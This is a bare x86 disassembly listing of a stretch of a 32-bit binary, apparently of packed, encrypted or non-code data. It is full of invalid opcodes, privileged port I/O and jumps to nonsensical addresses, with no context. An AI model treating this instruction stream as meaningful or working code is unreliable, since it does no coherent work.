  40e342:	gs (bad) 
  40e344:	cmp    eax,0xeb37dc42
  40e349:	jo     0x40e2d9
  40e34b:	jno    0x40e2e2
  40e34d:	out    0x80,al
  40e34f:	stos   BYTE PTR es:[edi],al
  40e350:	xor    eax,DWORD PTR [ebp+0x0]
  40e353:	pop    ebx
  40e354:	push   0x6b7d66b5
  40e359:	lock mov BYTE PTR [esp+edx*1],0xd9
  40e35e:	xchg   esp,eax
  40e35f:	ins    BYTE PTR es:[edi],dx
  40e360:	jbe    0x40e3c2
  40e362:	push   ebp
  40e363:	mov    ch,0xcb
  40e365:	inc    edx
  40e366:	outs   dx,DWORD PTR ds:[esi]
  40e367:	sub    dl,BYTE PTR [ecx+0x1f]
  40e36a:	mov    bl,0x50
  40e36c:	sub    al,0xf8
  40e36e:	jmp    0xa0e1d89d
  40e373:	dec    esi
  40e374:	xchg   edx,ebx
  40e376:	add    ebp,eax
  40e378:	repz ds jb 0x40e3aa
  40e37c:	inc    eax
  40e37d:	rol    ah,0xa4
  40e380:	fstp   QWORD PTR [ecx*1-0x314251fe]
  40e387:	push   edi
  40e388:	jg     0x40e3c3
  40e38a:	mov    ch,0xbb
  40e38c:	(bad)  
  40e38d:	jae    0x40e365
  40e38f:	outs   dx,DWORD PTR ds:[esi]
  40e390:	fs or  al,0xa2
  40e393:	cmp    edi,DWORD PTR [esi+0x20]
  40e396:	out    dx,eax
  40e397:	and    bl,BYTE PTR [eax-0x5f1a8709]
  40e39d:	sar    DWORD PTR [edx],cl
  40e39f:	out    dx,al
  40e3a0:	outs   dx,DWORD PTR ds:[esi]
  40e3a1:	mov    dh,0x13
  40e3a3:	pushf  
  40e3a4:	pop    es
  40e3a5:	aas    
  40e3a6:	mov    eax,0x66e0a33d
  40e3ab:	sub    DWORD PTR [esi-0x6bd74828],esi
  40e3b1:	sub    ecx,DWORD PTR ds:0x6b28bd65
  40e3b7:	leave  
  40e3b8:	fisttp DWORD PTR [ebp+0xe]
  40e3bb:	xchg   esp,eax
  40e3bc:	adc    edi,DWORD PTR [eax-0x6c476f1c]
  40e3c2:	fbld   TBYTE PTR [ebx]
  40e3c4:	cmp    DWORD PTR [esi+0x66],edi
  40e3c7:	sub    ah,dh
  40e3c9:	xchg   dh,bl
  40e3cb:	xor    al,0x23
  40e3cd:	jp     0x40e3da
  40e3cf:	pusha  
  40e3d0:	xor    cl,bl
  40e3d2:	push   ss
  40e3d3:	jp     0x40e3e8
  40e3d5:	test   eax,0xf0741bd6
  40e3da:	ds dec edx
  40e3dc:	jmp    0x40e3cb
  40e3de:	pop    ss
  40e3df:	xlat   BYTE PTR ds:[ebx]
  40e3e0:	jmp    0x40e3bf
  40e3e2:	sbb    al,BYTE PTR fs:[edi]
  40e3e5:	xchg   edx,eax
  40e3e6:	stos   DWORD PTR es:[edi],eax
  40e3e7:	or     DWORD PTR [ebx-0x20cd11e0],eax
  40e3ed:	retf   0x6792
  40e3f0:	iret   
  40e3f1:	je     0x40e3b7
  40e3f3:	jns    0x40e3f5
  40e3f5:	jnp    0x40e3c3
  40e3f7:	les    esi,FWORD PTR [edx+0x1f]
  40e3fa:	pop    ss
  40e3fb:	pop    es
  40e3fc:	shl    ah,0xa
  40e3ff:	aad    0xde
  40e401:	sub    al,BYTE PTR [edx+ebp*4]
  40e404:	sub    esi,DWORD PTR [esi-0x2b37377c]
  40e40a:	cmp    eax,0xc4de0859
  40e40f:	jle    0x40e41f
  40e411:	loop   0x40e488
  40e413:	jle    0x40e3d7
  40e415:	aas    
  40e416:	add    BYTE PTR [edx+0x1fcc6fc7],0xae
  40e41d:	fs loope 0x40e3c6
  40e420:	stos   BYTE PTR es:[edi],al
  40e421:	ins    BYTE PTR es:[edi],dx
  40e422:	jns    0x40e436
  40e424:	inc    ebp
  40e425:	and    eax,0xcbbd30eb
  40e42a:	and    DWORD PTR [ebp+ebp*2+0x6b],eax
  40e42e:	fwait
  40e42f:	mov    dl,0xee
  40e431:	iret   
  40e432:	cwde   
  40e433:	cmp    esp,edx
  40e435:	mov    eax,ds:0x859ece9f
  40e43a:	sahf   
  40e43b:	mov    ds:0x2b0e736d,al
  40e440:	push   cs
  40e441:	and    eax,0x2ec47ade
  40e446:	inc    edi
  40e447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e448:	or     ch,cl
  40e44a:	cmc    
  40e44b:	daa    
  40e44c:	loop   0x40e4a6
  40e44e:	or     eax,esp
  40e450:	inc    eax
  40e451:	shl    BYTE PTR ds:0x4bcae7fe,1
  40e457:	xor    eax,DWORD PTR ds:0xd86807bb
  40e45d:	sahf   
  40e45e:	pop    ss
  40e45f:	mov    bh,0xb8
  40e461:	mov    bl,0xbd
  40e463:	cmp    eax,0x4490e2fa
  40e468:	xlat   BYTE PTR ds:[ebx]
  40e469:	mov    ds:0x3dbbd434,eax
  40e46e:	dec    ebp
  40e46f:	mov    ds:0xa8fbbb0d,eax
  40e474:	cwde   
  40e475:	cmp    DWORD PTR [ebp+edi*1+0x19],0x4
  40e47a:	push   ebx
  40e47b:	lds    esp,FWORD PTR ds:[edi+0x7e8d194d]
  40e482:	jmp    0x6d42c7df
  40e487:	dec    esp
  40e488:	xlat   BYTE PTR ds:[ebx]
  40e489:	shr    BYTE PTR [edi+0x528d7123],cl
  40e48f:	pop    edi
  40e490:	or     dh,bl
  40e492:	ficomp DWORD PTR [eax]
  40e494:	pop    ebx
  40e495:	jle    0x40e42d
  40e497:	call   0x2d9d:0x787aa085
  40e49e:	xor    al,0x12
  40e4a0:	mov    ebx,0x564888e7
  40e4a5:	mov    DWORD PTR [eax],ebx
  40e4a7:	sbb    DWORD PTR [esi+edi*2+0x6f],esi
  40e4ab:	pop    esp
  40e4ac:	and    al,0xb3
  40e4ae:	rol    esi,0x5d
  40e4b1:	adc    al,0xcb
  40e4b3:	add    BYTE PTR [eax+0x7809fe90],al
  40e4b9:	xor    ah,dh
  40e4bb:	push   cs
  40e4bc:	out    dx,eax
  40e4bd:	mov    edi,0x8b795d7c
  40e4c2:	in     eax,0xd1
  40e4c4:	aad    0xe5
  40e4c6:	xchg   ebp,eax
  40e4c7:	call   0xa3053816
  40e4cc:	jecxz  0x40e52e
  40e4ce:	cwde   
  40e4cf:	pusha  
  40e4d0:	sbb    ah,cl
  40e4d2:	into   
  40e4d3:	add    DWORD PTR [ebx],edx
  40e4d5:	out    0x64,al
  40e4d7:	mov    cs,WORD PTR [esi+0x54]
  40e4da:	scas   eax,DWORD PTR es:[edi]
  40e4db:	or     eax,0x4a9437a0
  40e4e0:	(bad)  
  40e4e1:	aam    0x2d
  40e4e3:	(bad)  
  40e4e4:	fdivp  st(7),st
  40e4e6:	pop    es
  40e4e7:	stc    
  40e4e8:	imul   esi,DWORD PTR [ebx+0x25],0xffffff83
  40e4ec:	imul   BYTE PTR [eax+ebp*2+0x3c]
  40e4f0:	pop    ecx
  40e4f1:	(bad)  
  40e4f2:	jp     0x40e53b
  40e4f4:	and    DWORD PTR [ecx+eiz*1],esp
  40e4f7:	cmp    DWORD PTR [esi],esp
  40e4f9:	bound  ebx,QWORD PTR [esi]
  40e4fb:	add    DWORD PTR ds:0xf2c947f0,eax
  40e501:	inc    ebx
  40e502:	mov    esi,0x81fc53e3
  40e507:	mov    ds:0xa0255a17,eax
  40e50c:	dec    eax
  40e50d:	push   es
  40e50e:	shl    BYTE PTR [ecx+0x22],0x21
  40e512:	hlt    
  40e513:	and    ecx,DWORD PTR [ecx+0x44d15c6b]
  40e519:	sub    dh,0x19
  40e51c:	ins    BYTE PTR es:[edi],dx
  40e51d:	mov    dh,0xd5
  40e51f:	sbb    eax,0xbda0ff61
  40e524:	ret    0x3600
  40e527:	rcr    edi,1
  40e529:	jnp    0x40e59f
  40e52b:	push   ebp
  40e52c:	mov    ?,WORD PTR [eax-0x1e]
  40e52f:	add    BYTE PTR [edx],0x3
  40e532:	clc    
  40e533:	dec    ebp
  40e534:	rol    BYTE PTR [ebp+0x32],1
  40e537:	jg     0x40e4f9
  40e539:	push   es
  40e53a:	shl    DWORD PTR [edx],cl
  40e53c:	push   eax
  40e53d:	push   edx
  40e53e:	adc    ah,BYTE PTR [edx+0x23]
  40e541:	mov    ebp,0xe70c7fbd
  40e546:	loop   0x40e4ef
  40e548:	cli    
  40e549:	les    edi,FWORD PTR [ecx+0x46]
  40e54c:	push   esp
  40e54d:	push   0xe17373d3
  40e552:	outs   dx,DWORD PTR ds:[esi]
  40e553:	lods   al,BYTE PTR ds:[esi]
  40e554:	(bad)  
  40e555:	aad    0x6
  40e557:	mov    esp,0x3383fa42
  40e55c:	push   es
  40e55d:	push   ds
  40e55e:	jae    0x40e59c
  40e560:	mov    esi,0xade976df
  40e565:	mov    eax,eax
  40e567:	mov    ds:0x2a137377,al
  40e56c:	jg     0x40e59d
  40e56e:	push   eax
  40e56f:	out    dx,eax
  40e570:	and    BYTE PTR [esi+0x51],bl
  40e573:	dec    esi
  40e574:	mov    al,ds:0x182be1a6
  40e579:	mov    ds:0x9cb3f546,al
  40e57e:	js     0x40e5e6
  40e580:	je     0x40e5d2
  40e582:	into   
  40e583:	push   0x76a08359
  40e588:	mov    dh,0x84
  40e58a:	xchg   esi,eax
  40e58b:	xchg   ebp,eax
  40e58c:	shr    DWORD PTR [esi+ebp*4+0x4f],cl
  40e590:	(bad)  [edx]
  40e592:	clts   
  40e594:	cwde   
  40e595:	mov    al,ds:0xbc7d3240
  40e59a:	loopne 0x40e5fd
  40e59c:	mov    ss,WORD PTR [ecx-0x74184297]
  40e5a2:	inc    edx
  40e5a3:	add    eax,0x9422fafd
  40e5a8:	aaa    
  40e5a9:	(bad)  
  40e5aa:	int3   
  40e5ab:	in     eax,dx
  40e5ac:	daa    
  40e5ad:	(bad)  
  40e5ae:	lds    ebx,FWORD PTR [edx+0x46]
  40e5b1:	sub    eax,0xb1c12ca8
  40e5b6:	jl     0x40e5ec
  40e5b8:	and    DWORD PTR [esi+0x5c],ebp
  40e5bb:	retf   
  40e5bc:	mov    ah,0x43
  40e5be:	or     DWORD PTR [ebx],edx
  40e5c0:	mov    ch,0x53
  40e5c2:	repz int3 
  40e5c4:	push   eax
  40e5c5:	mov    eax,0xfe7b5c8
  40e5ca:	in     eax,dx
  40e5cb:	jge    0x40e5b6
  40e5cd:	lds    esp,FWORD PTR [edx+0x19]
  40e5d0:	(bad)  
  40e5d2:	push   esp
  40e5d3:	arpl   WORD PTR [ebx],si
  40e5d5:	mov    ds,WORD PTR [eax+0x2e]
  40e5d8:	and    BYTE PTR [ecx],cl
  40e5da:	icebp  
  40e5db:	sar    BYTE PTR [ecx+0x5af0ffc6],cl
  40e5e1:	push   es
  40e5e2:	inc    ebp
  40e5e3:	fsubr  DWORD PTR [eax+0x25]
  40e5e6:	push   ds
  40e5e7:	int3   
  40e5e8:	xor    al,cl
  40e5ea:	pop    ds
  40e5eb:	outs   dx,DWORD PTR ds:[esi]
  40e5ec:	ret    0x116
  40e5ef:	nop
  40e5f0:	cmp    eax,0x17684a48
  40e5f5:	out    dx,eax
  40e5f6:	stc    
  40e5f7:	repz inc ebx
  40e5f9:	sub    ebx,ebp
  40e5fb:	inc    ebx
  40e5fc:	adc    ebp,DWORD PTR [edx]
  40e5fe:	sub    BYTE PTR [edi],dh
  40e600:	dec    ecx
  40e601:	xchg   ecx,eax
  40e602:	mov    eax,0x4875ef5b
  40e607:	pop    esp
  40e608:	push   ebp
  40e609:	jb     0x40e5a1
  40e60b:	pop    ecx
  40e60c:	lea    edx,[ecx-0x6e27485d]
  40e612:	cdq    
  40e613:	sub    dh,bh
  40e615:	addr16 enter 0x4903,0xca
  40e61a:	cld    
  40e61b:	mov    bh,0x89
  40e61d:	inc    eax
  40e61e:	jge    0x40e5a4
  40e620:	stc    
  40e621:	test   eax,0xafe1fbeb
  40e626:	rep stos DWORD PTR es:[edi],eax
  40e628:	ret    
  40e629:	inc    ebp
  40e62a:	mov    ?,WORD PTR [ebp+eax*8+0x27]
  40e62e:	pusha  
  40e62f:	jge    0x40e66a
  40e631:	xchg   ebx,eax
  40e632:	stos   BYTE PTR es:[edi],al
  40e633:	ins    BYTE PTR es:[edi],dx
  40e634:	xor    ebp,DWORD PTR [edi-0x43]
  40e637:	mov    ah,0x81
  40e639:	or     BYTE PTR [edx-0x5c],ch
  40e63c:	cdq    
  40e63d:	pop    esi
  40e63e:	ror    DWORD PTR [esi+0x7b],0x39
  40e642:	pushf  
  40e643:	fisttp WORD PTR [ecx-0xd]
  40e646:	fsub   DWORD PTR [esi]
  40e648:	jnp    0x40e6a2
  40e64a:	or     cl,BYTE PTR [ecx]
  40e64c:	cmp    DWORD PTR [eax-0x23],edi
  40e64f:	mov    dh,0xb4
  40e651:	loope  0x40e68d
  40e653:	jb     0x40e66c
  40e655:	(bad)  
  40e656:	jp     0x40e6c6
  40e658:	cdq    
  40e659:	cli    
  40e65a:	daa    
  40e65b:	popa   
  40e65c:	xchg   ecx,eax
  40e65d:	(bad)  
  40e65e:	retf   0x81e8
  40e661:	out    0xe,eax
  40e663:	cmp    al,0xac
  40e665:	pop    esp
  40e666:	sbb    bh,BYTE PTR [ebx+eax*1-0xf]
  40e66a:	and    DWORD PTR [ebp*2-0x523ed6b1],0x70
  40e672:	and    eax,0x3ab21d69
  40e677:	or     al,0xd1
  40e679:	jmp    0xd96d:0xae61e96c
  40e680:	mov    ds:0xdd06e0d8,al
  40e685:	(bad)  
  40e686:	sbb    bl,BYTE PTR [edi]
  40e688:	into   
  40e689:	lods   eax,DWORD PTR ds:[esi]
  40e68a:	jp     0x40e6e7
  40e68c:	sbb    DWORD PTR [esi-0x177a690d],edx
  40e692:	dec    ecx
  40e693:	cld    
  40e694:	xor    bh,BYTE PTR [edi]
  40e696:	dec    ecx
  40e697:	fidivr WORD PTR [ebx]
  40e699:	mov    ds:0x5c814d96,eax
  40e69e:	aam    0x4e
  40e6a0:	sti    
  40e6a1:	shl    DWORD PTR ds:0xb7a0109,cl
  40e6a7:	mov    al,ds:0xfa83774b
  40e6ac:	xor    al,0x7d
  40e6ae:	rol    BYTE PTR [eax],1
  40e6b0:	xchg   esi,eax
  40e6b1:	nop
  40e6b2:	cld    
  40e6b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6b4:	cmp    ch,0x7f
  40e6b7:	mov    DWORD PTR ds:0xad24dc7f,0x3bfe9573
  40e6c1:	adc    cl,cl
  40e6c3:	jge    0x40e731
  40e6c5:	jl     0x40e6b3
  40e6c7:	dec    ebp
  40e6c8:	clc    
  40e6c9:	aam    0x29
  40e6cb:	repz pushf 
  40e6cd:	pop    ebp
  40e6ce:	mov    bl,0xad
  40e6d0:	js     0x40e69a
  40e6d2:	and    esp,ebp
  40e6d4:	jo     0x40e659
  40e6d6:	jbe    0x40e69c
  40e6d8:	or     DWORD PTR [ecx-0x4d3ee063],ebx
  40e6de:	js     0x40e66d
  40e6e0:	aaa    
  40e6e1:	fdivr  DWORD PTR [ebx+edx*4+0x39]
  40e6e5:	fdiv   QWORD PTR [ecx+0x4f86e6a6]
  40e6eb:	maxps  xmm7,XMMWORD PTR [edi]
  40e6ee:	xor    BYTE PTR [edx],dh
  40e6f0:	frndint 
  40e6f2:	and    bl,bh
  40e6f4:	mov    ebx,0xd5336d30
  40e6f9:	nop
  40e6fa:	push   ebx
  40e6fb:	mov    ch,0x29
  40e6fd:	and    BYTE PTR [ecx-0x6e],dh
  40e700:	ss pop ecx
  40e702:	push   eax
  40e703:	sbb    cl,ah
  40e705:	inc    ebp
  40e706:	fcmovbe st,st(0)
  40e708:	test   al,0x26
  40e70a:	mov    al,fs:0xa34b9670
  40e710:	push   es
  40e711:	fmul   st(5),st
  40e713:	in     eax,dx
  40e714:	jno    0x40e701
  40e716:	sbb    al,0x21
  40e718:	xchg   ebx,eax
  40e719:	cmp    ecx,DWORD PTR [ecx+0x79]
  40e71c:	add    eax,0x61eee086
  40e721:	or     eax,edx
  40e723:	outs   dx,BYTE PTR ds:[esi]
  40e724:	lea    eax,[edi-0x2e]
  40e727:	pop    ds
  40e728:	push   edi
  40e729:	sbb    bh,dh
  40e72b:	mov    al,0xc9
  40e72d:	sti    
  40e72e:	call   0x9303c4f5
  40e733:	addr16 xor dl,ch
  40e736:	mov    al,0x25
  40e738:	jns    0x40e759
  40e73a:	out    dx,eax
  40e73b:	pop    ss
  40e73c:	jg     0x40e764
  40e73e:	dec    edx
  40e73f:	outs   dx,DWORD PTR ds:[esi]
  40e740:	lods   eax,DWORD PTR ds:[esi]
  40e741:	mov    ds:0xf24003a,eax
  40e746:	addr16 push 0xffffffbb
  40e749:	std    
  40e74a:	sbb    BYTE PTR [ecx],bl
  40e74c:	cwde   
  40e74d:	das    
  40e74e:	aaa    
  40e74f:	sbb    al,0xf0
  40e751:	mov    ah,0xc5
  40e753:	lea    esi,ds:0xb21d0a41
  40e759:	cmc    
  40e75a:	sar    BYTE PTR [ebx-0x5423de4d],1
  40e760:	inc    edx
  40e761:	mov    ds:0x84183390,al
  40e766:	aad    0x74
  40e768:	pop    edi
  40e769:	jl     0x40e757
  40e76b:	leave  
  40e76c:	fst    QWORD PTR [eax-0x6b]
  40e76f:	mov    WORD PTR [edx-0x20],ss
  40e772:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e773:	mov    dl,0x8f
  40e775:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e776:	jp     0x40e7c8
  40e778:	addr16 test ebp,esp
  40e77b:	and    BYTE PTR [esi],0x16
  40e77e:	mov    esp,0xcdb9152c
  40e783:	call   0xcf48f987
  40e788:	(bad)  
  40e789:	push   0x30
  40e78b:	popa   
  40e78c:	dec    esp
  40e78d:	rol    ebp,cl
  40e78f:	ror    esi,1
  40e791:	mov    cl,0xfb
  40e793:	xchg   edi,eax
  40e794:	mov    bl,ah
  40e796:	sub    DWORD PTR [esi-0x11a33e1b],0x19
  40e79d:	jns    0x40e799
  40e79f:	out    0x75,al
  40e7a1:	or     DWORD PTR [edi+0x10],eax
  40e7a4:	ss data16 aas 
  40e7a7:	pop    ds
  40e7a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7a9:	inc    ebx
  40e7aa:	es loopne 0x40e78c
  40e7ad:	jle    0x40e791
  40e7af:	int    0x0
  40e7b1:	and    esi,DWORD PTR [ecx-0x7]
  40e7b4:	shl    DWORD PTR [ebx-0x21ff8fad],0x87
  40e7bb:	ficom  DWORD PTR [edx+0x1]
  40e7be:	and    bl,BYTE PTR [ebx-0x4f]
  40e7c1:	(bad)  
  40e7c3:	(bad)  
  40e7c4:	imul   esi,ebp,0x39a1a715
  40e7ca:	arpl   bx,si
  40e7cc:	mov    cl,0x39
  40e7ce:	in     eax,0x5c
  40e7d0:	adc    dh,ch
  40e7d2:	pop    ebp
  40e7d3:	aam    0x97
  40e7d5:	inc    BYTE PTR ds:0xd5fb4392
  40e7db:	test   DWORD PTR [ebx-0x36de6187],edi
  40e7e1:	fs push eax
  40e7e3:	sub    al,BYTE PTR [esi-0x6d]
  40e7e6:	fiadd  WORD PTR [edx]
  40e7e8:	das    
  40e7e9:	xchg   bl,al
  40e7eb:	push   0xffffff8c
  40e7ed:	rol    DWORD PTR [eax+0x19],cl
  40e7f0:	add    al,0xf5
  40e7f2:	mov    eax,ds:0x35813803
  40e7f7:	enter  0xe7c6,0xec
  40e7fb:	xor    BYTE PTR [eax+0x6578d84c],0xda
  40e802:	popa   
  40e803:	push   es
  40e804:	dec    ebx
  40e805:	push   ss
  40e806:	shr    BYTE PTR [esi],cl
  40e808:	daa    
  40e809:	nop
  40e80a:	mov    edi,0x50cf392e
  40e80f:	xor    DWORD PTR [ebp-0x4a],0x4e8e2c1
  40e816:	add    al,0xb
  40e818:	bnd ret 
  40e81a:	dec    ebx
  40e81b:	(bad)  
  40e81c:	xchg   edx,eax
  40e81d:	pushf  
  40e81e:	(bad)  
  40e820:	out    0x2a,al
  40e822:	cs call 0x80:0xc7df3f8d
  40e82a:	add    cl,bl
  40e82c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e82d:	adc    al,0xa
  40e82f:	mov    edi,0x1653b6de
  40e834:	jmp    0x40e853
  40e836:	xchg   ecx,eax
  40e837:	out    0x58,al
  40e839:	add    ah,BYTE PTR [ecx-0x47]
  40e83c:	aam    0x64
  40e83e:	jns    0x40e858
  40e840:	xor    DWORD PTR [edi+eiz*2+0x4151d67c],esp
  40e847:	addr16 dec ebx
  40e849:	aas    
  40e84a:	mov    ebp,0x75a28db9
  40e84f:	cld    
  40e850:	xor    ebx,0x27
  40e853:	cwde   
  40e854:	sbb    BYTE PTR [ebp-0x219a4352],dl
  40e85a:	add    al,0x4b
  40e85c:	or     BYTE PTR [edi],cl
  40e85e:	xor    al,0xa6
  40e860:	cmp    BYTE PTR [edi+0x7c],0x46
  40e864:	xor    eax,0xe783ef34
  40e869:	and    BYTE PTR [ecx],ch
  40e86b:	push   esp
  40e86c:	sti    
  40e86d:	inc    esi
  40e86e:	je     0x40e893
  40e870:	sti    
  40e871:	ja     0x40e813
  40e873:	xchg   edx,eax
  40e874:	sub    DWORD PTR [ebx],edi
  40e876:	or     esp,DWORD PTR [ebx+0x3315b890]
  40e87c:	loope  0x40e7fe
  40e87e:	sbb    DWORD PTR [edx-0x39],ebx
  40e881:	sbb    BYTE PTR [ebx+0x67],ah
  40e884:	inc    edi
  40e885:	stc    
  40e886:	lea    edi,[edx]
  40e888:	out    dx,al
  40e889:	jns    0x40e8b1
  40e88b:	daa    
  40e88c:	mul    ah
  40e88e:	in     eax,0xa3
  40e890:	in     al,dx
  40e891:	mov    ecx,0x462c1b5a
  40e896:	mov    bl,0xde
  40e898:	into   
  40e899:	out    0xc2,eax
  40e89b:	sub    dh,BYTE PTR [edx-0x5344873f]
  40e8a1:	(bad)  
  40e8a2:	fcomp  DWORD PTR [eax-0x2de7110e]
  40e8a8:	stc    
  40e8a9:	shl    BYTE PTR [edx+0xcce5de5],1
  40e8af:	imul   ebx,DWORD PTR [esi+0x6a],0xffffffa6
  40e8b3:	fnsave [edx-0x324d8d6a]
  40e8b9:	popa   
  40e8ba:	repnz inc ebx
  40e8bc:	mov    edx,0x7d3eb55a
  40e8c1:	sbb    eax,0x5ea2b02e
  40e8c6:	fcom   QWORD PTR [ecx+0x66183f12]
  40e8cc:	inc    edx
  40e8cd:	mov    ?,edx
  40e8cf:	rcr    cl,1
  40e8d1:	repnz add edx,DWORD PTR [ecx]
  40e8d4:	sbb    al,BYTE PTR [ebx]
  40e8d6:	dec    eax
  40e8d7:	sub    DWORD PTR [edi],esp
  40e8d9:	adc    DWORD PTR [esp+edi*4],edx
  40e8dc:	cmp    cl,BYTE PTR [edi+0x43]
  40e8df:	not    DWORD PTR [ebx-0x192b115]
  40e8e5:	(bad)  
  40e8e6:	dec    esi
  40e8e7:	and    esi,DWORD PTR [edx]
  40e8e9:	pushf  
  40e8ea:	push   esp
  40e8eb:	shl    ebp,0x83
  40e8ee:	inc    edx
  40e8ef:	pop    ebx
  40e8f0:	call   0x25c:0x80af3b0c
  40e8f7:	add    BYTE PTR [edx-0x2c],ch
  40e8fa:	add    al,0x96
  40e8fc:	lahf   
  40e8fd:	or     eax,0xe9e5fd20
  40e902:	mov    edi,ds
  40e904:	bound  edx,QWORD PTR [edi-0x80]
  40e907:	ins    DWORD PTR es:[edi],dx
  40e908:	sub    al,0x7d
  40e90a:	and    esi,edi
  40e90c:	jl     0x40e89f
  40e90e:	inc    ecx
  40e90f:	pop    edx
  40e910:	sub    eax,0xbc400fd9
  40e915:	(bad)  
  40e916:	stos   BYTE PTR es:[edi],al
  40e917:	dec    esp
  40e918:	pusha  
  40e919:	mov    ch,0x79
  40e91b:	mov    dh,0x84
  40e91d:	out    dx,eax
  40e91e:	xchg   ecx,eax
  40e91f:	mov    dh,0x8b
  40e921:	xor    BYTE PTR [esi+0x3e5a48df],ch
  40e927:	loope  0x40e96d
  40e929:	cli    
  40e92a:	jp     0x40e8da
  40e92c:	mov    WORD PTR [eax+ecx*8+0x634768fb],ss
  40e933:	sbb    eax,0x607fefd7
  40e938:	push   0x72
  40e93a:	mov    esp,0x5022311b
  40e93f:	mov    bl,0x3f
  40e941:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e942:	sti    
  40e943:	ret    
  40e944:	and    DWORD PTR [ecx+0x24],0x63
  40e948:	mov    edi,0x88bf994f
  40e94d:	loop   0x40e8f5
  40e94f:	daa    
  40e950:	adc    al,BYTE PTR [ecx+0xf]
  40e953:	in     al,dx
  40e954:	xchg   esp,eax
  40e955:	xor    bh,cl
  40e957:	xor    edi,esi
  40e959:	mov    cl,0xcf
  40e95b:	fadd   st,st(7)
  40e95d:	out    0xfd,eax
  40e95f:	ja     0x40e963
  40e961:	inc    eax
  40e962:	test   al,0xa6
  40e964:	dec    edi
  40e965:	push   cs
  40e966:	(bad)  
  40e967:	jg     0x40e941
  40e969:	lock pop ecx
  40e96b:	sub    al,0x1c
  40e96d:	sbb    DWORD PTR ds:0x21f9d838,edi
  40e973:	jl     0x40e90f
  40e975:	xor    edx,DWORD PTR ds:0x2503093a
  40e97b:	or     BYTE PTR [edi],bh
  40e97d:	jno    0x40e995
  40e97f:	pop    eax
  40e980:	inc    ecx
  40e981:	imul   esi,esi,0xffffffca
  40e984:	mov    dh,0x84
  40e986:	cmp    al,0xd7
  40e988:	push   esi
  40e989:	mov    edi,0x8a043fb8
  40e98e:	pop    es
  40e98f:	jmp    0x1c6fc5e6
  40e994:	jle    0x40e9cf
  40e996:	cmp    esp,DWORD PTR [edi+0x50788066]
  40e99c:	(bad)  [ebx]
  40e99e:	jnp    0x40e93f
  40e9a0:	inc    esp
  40e9a1:	push   es
  40e9a2:	push   ebx
  40e9a3:	mul    DWORD PTR [ecx+0x3a]
  40e9a6:	dec    edi
  40e9a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9a8:	and    BYTE PTR [ebx-0x80],bh
  40e9ab:	mov    cl,0xf
  40e9ad:	jge    0x40e980
  40e9af:	outs   dx,DWORD PTR ds:[esi]
  40e9b0:	add    al,0x2d
  40e9b2:	div    DWORD PTR [eax-0x1604cef0]
  40e9b8:	(bad)  
  40e9b9:	cli    
  40e9ba:	outs   dx,BYTE PTR ds:[esi]
  40e9bb:	arpl   WORD PTR [edi+0x65bce790],si
  40e9c1:	mov    ah,0x83
  40e9c3:	xor    ebx,DWORD PTR [ebx]
  40e9c5:	retf   
  40e9c6:	in     al,dx
  40e9c7:	ror    DWORD PTR [ebx-0x27],cl
  40e9ca:	or     DWORD PTR [ecx+0x1b32f19f],esi
  40e9d0:	cld    
  40e9d1:	int    0x4a
  40e9d3:	and    al,0x19
  40e9d5:	mov    DWORD PTR [eax],ecx
  40e9d7:	mov    esi,0xe457efa2
  40e9dc:	lods   eax,DWORD PTR ds:[esi]
  40e9dd:	das    
  40e9de:	cwde   
  40e9df:	adc    DWORD PTR [edx],ebp
  40e9e1:	iret   
  40e9e2:	sbb    DWORD PTR [esi+0x625f6e26],edx
  40e9e8:	rcr    esi,cl
  40e9ea:	push   0xfffffff9
  40e9ec:	push   edx
  40e9ed:	inc    edi
  40e9ee:	xlat   BYTE PTR ds:[ebx]
  40e9ef:	ds stc 
  40e9f1:	xchg   ebp,eax
  40e9f2:	adc    eax,0x5a974a83
  40e9f7:	pop    ebx
  40e9f8:	lahf   
  40e9f9:	scas   eax,DWORD PTR es:[edi]
  40e9fa:	sbb    BYTE PTR [ebp-0x62c8acda],ch
  40ea00:	xchg   edi,eax
  40ea01:	aas    
  40ea02:	jo     0x40ea74
  40ea04:	js     0x40e9b1
  40ea06:	or     ecx,DWORD PTR [ecx]
  40ea08:	imul   esp,ecx,0xe
  40ea0b:	cwde   
  40ea0c:	je     0x40e9f4
  40ea0e:	and    eax,0x186da71d
  40ea13:	outs   dx,BYTE PTR ds:[esi]
  40ea14:	das    
  40ea15:	or     eax,0xb95c4705
  40ea1a:	inc    ecx
  40ea1b:	imul   ebp,edi,0x74
  40ea1e:	fcomp  QWORD PTR [ebp+0x7d]
  40ea21:	inc    edx
  40ea22:	(bad)  
  40ea23:	aad    0xd8
  40ea25:	pop    DWORD PTR ds:0xaa83cc5f
  40ea2b:	(bad)
  40ea2e:	jo     0x40e9ca
  40ea30:	push   edi
  40ea31:	rcr    BYTE PTR [eax-0xa],1
  40ea34:	cld    
  40ea35:	pop    edi
  40ea36:	mov    cl,0x51
  40ea38:	fnstsw WORD PTR [edi+0x18]
  40ea3b:	je     0x40eaba
  40ea3d:	aas    
  40ea3e:	fwait
  40ea3f:	mov    dl,0xcb
  40ea41:	sbb    eax,0x10ada5f3
  40ea46:	sub    eax,0x5cc583a0
  40ea4b:	xchg   BYTE PTR [edx+0x5a],al
  40ea4e:	xchg   esi,eax
  40ea4f:	push   0x23
  40ea51:	and    edi,DWORD PTR [ebx]
  40ea53:	add    ecx,ecx
  40ea55:	cmp    ecx,DWORD PTR [ecx-0x63cee53d]
  40ea5b:	mov    eax,0x2920a4af
  40ea60:	jne    0x40ea11
  40ea62:	pop    ebp
  40ea63:	dec    eax
  40ea64:	fwait
  40ea65:	cwde   
  40ea66:	retf   0x8101
  40ea69:	pushf  
  40ea6a:	mov    dl,BYTE PTR [edi+0x344c62af]
  40ea70:	test   cl,bh
  40ea72:	add    DWORD PTR [ebx+0x2df3523a],edi
  40ea78:	lock or edi,esp
  40ea7b:	push   ecx
  40ea7c:	lods   eax,DWORD PTR ds:[esi]
  40ea7d:	sbb    al,0x58
  40ea7f:	rol    BYTE PTR [edi],cl
  40ea81:	int    0xba
  40ea83:	dec    ebp
  40ea84:	scas   al,BYTE PTR es:[edi]
